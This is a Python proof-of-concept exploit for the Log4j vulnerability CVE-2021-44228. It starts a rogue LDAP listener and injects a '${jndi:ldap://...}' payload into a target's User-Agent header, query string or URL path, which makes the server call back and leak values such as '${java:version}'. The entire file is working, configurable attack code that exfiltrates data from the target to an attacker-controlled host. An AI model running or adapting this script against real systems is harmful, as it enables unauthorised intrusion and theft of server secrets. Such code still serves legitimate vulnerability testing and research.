#!/usr/bin/env python3

# Pure python ENV variable leak PoC for CVE-2021-44228
# Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284
#
# 2021 @leonjza

import argparse
import socketserver
import threading
import time
from urllib.parse import urljoin

import requests

LDAP_HEADER = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a'


class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        print(f' i| new connection from {self.client_address[0]}')

        sock = self.request
        sock.recv(1024)
        sock.sendall(LDAP_HEADER)

        data = sock.recv(1024)
        data = data[9:]  # strip header

        # example response
        #
        # ('Java version 11.0.13\n'
        #  '\x01\x00\n'
        #  '\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b'
        #  'objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2')

        data = data.decode(errors='ignore').split('\n')[0]
        print(f' v| extracted value: {data}')


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass


def main():
    parser = argparse.ArgumentParser(description='a simple log4j <=2.14 information disclosure poc '
                                                 '(ref: https://twitter.com/Black2Fan/status/1470281005038817284)')
    parser.add_argument('--target', '-t', required=True, help='target uri')
    parser.add_argument('--listen-host', default='0.0.0.0',
                        help='exploit server host to listen on (default: 127.0.0.1)')
    parser.add_argument('--listen-port', '-lp', default=8888, help='exploit server port to listen on (default: 8888)')
    parser.add_argument('--exploit-host', '-eh', required=True, default='127.0.0.1',
                        help='host where (this) exploit server is reachable')
    parser.add_argument('--leak', '-l', default='${java:version}',
                        help='value to leak. '
                             'see: https://twitter.com/Rayhan0x01/status/1469571563674505217 '
                             '(default: ${java:version})')
    parser.add_argument('--dump-resp', action='store_true', help='dump the http response body')
    # payload types
    parser.add_argument('--payload-all', '-pa', action='store_true', help='use the payload everywhere')
    parser.add_argument('--payload-header', '-ph', action='store_true', default=True,
                        help='use the payload as the user-agent header')
    parser.add_argument('--payload-query-string', '-pq', action='store_true',
                        help='use the payload as query string param')
    parser.add_argument('--payload-path', '-pp', action='store_true', help='use the payload as parth of the path')
    args = parser.parse_args()

    print(f' i| starting server on {args.listen_host}:{args.listen_port}')
    server = ThreadedTCPServer((args.listen_host, int(args.listen_port)), ThreadedTCPRequestHandler)

    serv_thread = threading.Thread(target=server.serve_forever)
    serv_thread.daemon = True
    serv_thread.start()
    time.sleep(1)
    print(f' i| server started')

    payload = f'${{jndi:ldap://{args.exploit_host}:{args.listen_port}/{args.leak}}}'

    # prepare the request
    headers = {}
    params = {}
    target = args.target if args.target.endswith('/') else args.target + '/'

    # add payloads based on flags
    if args.payload_all or args.payload_header:
        print(f' i| setting payload in User-Agent header')
        headers['User-Agent'] = payload

    if args.payload_all or args.payload_query_string:
        print(f' i| setting payload as query string \'q\'')
        params['q'] = payload

    if args.payload_all or args.payload_path:
        print(f' i| setting payload as part of the uri path')
        target = urljoin(target, payload)

    # fire ze lazor
    print(f' i| sending exploit payload {payload} to {target}')

    try:
        r = requests.get(args.target, headers=headers, params=params)
        print(f' i| request url was: {r.url}')
        print(f' i| response status code: {r.status_code}')
        if args.dump_resp:
            print(f' i| response: {r.text}')
    except Exception as e:
        print(f' e| failed to make request: {e}')
    finally:
        server.shutdown()
        server.server_close()


if __name__ == '__main__':
    main()
